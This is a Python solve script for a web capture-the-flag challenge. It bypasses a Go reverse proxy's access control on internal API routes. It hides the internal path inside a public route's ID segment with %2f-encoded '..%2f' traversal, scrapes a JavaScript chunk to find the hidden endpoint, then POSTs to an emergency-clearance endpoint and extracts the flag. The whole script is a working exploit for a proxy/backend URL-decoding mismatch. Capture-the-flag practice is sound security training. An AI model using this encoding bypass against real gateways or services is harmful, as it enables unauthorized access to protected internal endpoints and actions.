#!/usr/bin/env python3
"""Corridor Transit Gate — CSCTF 2026 (Web).

Bypasses the Go reverse-proxy ACL on /api/v1/internal/* by hiding the prefix
inside the {id} segment of a public route with %2f-encoded traversal, then
POSTs the internal emergency-clearance endpoint.

Usage: python3 solve.py http://<assigned-host>:<port> [consignment_id]
"""
import json
import re
import sys
import urllib.error
import urllib.request

B = sys.argv[1].rstrip("/")
CONSIGN = sys.argv[2] if len(sys.argv) > 2 else "CTLD-FR-8821"

# gateway checks the raw prefix and does not decode %2f; the backend does.
PREFIX = "/api/v1/telemetry/station/..%2f..%2f"


def req(path, method="GET", body=None, headers=None):
    data = body.encode() if body is not None else None
    r = urllib.request.Request(B + path, data=data, method=method)
    for k, v in (headers or {}).items():
        r.add_header(k, v)
    # urllib keeps %2f intact (does not re-normalise the path)
    try:
        with urllib.request.urlopen(r, timeout=25) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def main():
    # discover the internal route from the dispatch-admin JS chunk
    _, js = req("/static/assets/js/chunks/chunk-dispatch-admin.9c4d.js")
    m = re.search(r'/api/v1/internal/[a-z/_-]*emergency-clearance', js)
    route = m.group(0) if m else "/api/v1/internal/dispatch/emergency-clearance"
    print("[*] internal route:", route)

    # hide "internal/..." behind the telemetry {id} segment, %2f-encoded
    sub = route[len("/api/v1/"):].replace("/", "%2f")  # internal%2fdispatch%2f...
    path = PREFIX + sub
    body = json.dumps({"consignment_id": CONSIGN, "reason": "Authorized emergency corridor escort"})
    st, r = req(
        path,
        "POST",
        body=body,
        headers={"Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest"},
    )
    print("[*]", st, r)
    fm = re.search(r"CSCTF\{[^}]+\}", r)
    if fm:
        print("\n[FLAG]", fm.group(0))


if __name__ == "__main__":
    main()
